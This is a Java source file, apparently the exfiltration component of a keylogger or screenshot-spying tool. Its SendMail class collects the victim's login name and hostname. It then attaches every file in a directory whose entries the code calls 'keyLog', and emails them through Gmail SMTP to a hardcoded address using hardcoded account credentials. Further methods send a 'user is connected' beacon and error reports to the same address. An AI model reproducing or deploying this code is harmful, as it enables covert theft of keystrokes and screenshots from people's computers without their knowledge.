package Logging;

import java.io.File;
import java.net.InetAddress;
import java.util.Hashtable;
import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

public class SendMail {
	String subject;
	final String username = "shoottothrill007"; //"screenshottaker12";
	final String pw = "12345678__"; // "accio123";

	File dir;
	Message mail;
	BodyPart mailBody = new MimeBodyPart();
	Multipart multi = new MimeMultipart();
	String[] files;

	SendMail(){

	}
	SendMail(File dir){
		this.dir = dir;
	}
	public String getUserName() throws Exception{
		String comName = System.getProperty("user.name");
		System.out.println("getUserName() \n"+comName);

		InetAddress localMachine = InetAddress.getLocalHost();
		String host = localMachine.getHostName();
		System.out.println(host);
		subject = comName + " | " + host;
		return subject;
	}

	public void sender() throws Exception{
		Properties prop = new Properties();
		prop.put("mail.smtp.auth", "true");
		prop.put("mail.smtp.starttls.enable", "true");
		prop.put("mail.smtp.host", "smtp.gmail.com");
		prop.put("mail.smtp.port", "587");

		Session session = Session.getInstance(prop,
				new javax.mail.Authenticator() {
			protected PasswordAuthentication getPasswordAuthentication() {
				return new PasswordAuthentication(username, pw);
			}
		});

		mail = new MimeMessage(session);
		mail.setFrom(new InternetAddress(username+ "@gmail.com"));
		mail.setRecipients(Message.RecipientType.TO, InternetAddress.parse("shoottothrill007@gmail.com"));
		mail.setSubject(getUserName());
		String[] all = dir.list();
		files = new String[all.length];
		for(int i = 0; i < all.length; i++){
			File keyLog= new File(dir, all[i]);
			String path = keyLog.getAbsolutePath();
			System.out.println(path);
			MimeBodyPart attachment = new MimeBodyPart();
			attachment.attachFile(path);
			System.out.println("attached");
			multi.addBodyPart(attachment);
		}


		mail.setContent(multi);
		System.out.println("something is still right");
		Transport.send(mail);
		System.out.println("mail sent");
	}

	public void testMailSender() throws Exception{
		Properties prop = new Properties();
		prop.put("mail.smtp.auth", "true");
		prop.put("mail.smtp.starttls.enable", "true");
		prop.put("mail.smtp.host", "smtp.gmail.com");
		prop.put("mail.smtp.port", "587");
		System.out.println("Will authenticate now!");
		Session session = Session.getInstance(prop,
				new javax.mail.Authenticator() {
			protected PasswordAuthentication getPasswordAuthentication() {
				return new PasswordAuthentication(username, pw);
			}
		});

		mail = new MimeMessage(session);
		mail.setFrom(new InternetAddress(username+ "@gmail.com"));
		mail.setRecipients(Message.RecipientType.TO, InternetAddress.parse("shoottothrill007@gmail.com"));
		mail.setSubject(getUserName());
		mail.setText("user is connected");
		Transport.send(mail);
		System.out.println("test sent");

	}
	public void errSender(Exception e) throws Exception{
		Properties prop = new Properties();
		prop.put("mail.smtp.auth", "true");
		prop.put("mail.smtp.starttls.enable", "true");
		prop.put("mail.smtp.host", "smtp.gmail.com");
		prop.put("mail.smtp.port", "587");

		Session session = Session.getInstance(prop,
				new javax.mail.Authenticator() {
			protected PasswordAuthentication getPasswordAuthentication() {
				return new PasswordAuthentication(username, pw);
			}
		});

		mail = new MimeMessage(session);
		mail.setFrom(new InternetAddress(username+ "@gmail.com"));
		mail.setRecipients(Message.RecipientType.TO, InternetAddress.parse("shoottothrill007@gmail.com"));
		mail.setSubject(getUserName());
		mail.setText(e + " occured while sending");
		Transport.send(mail);
		System.out.println("test sent");

	}
}


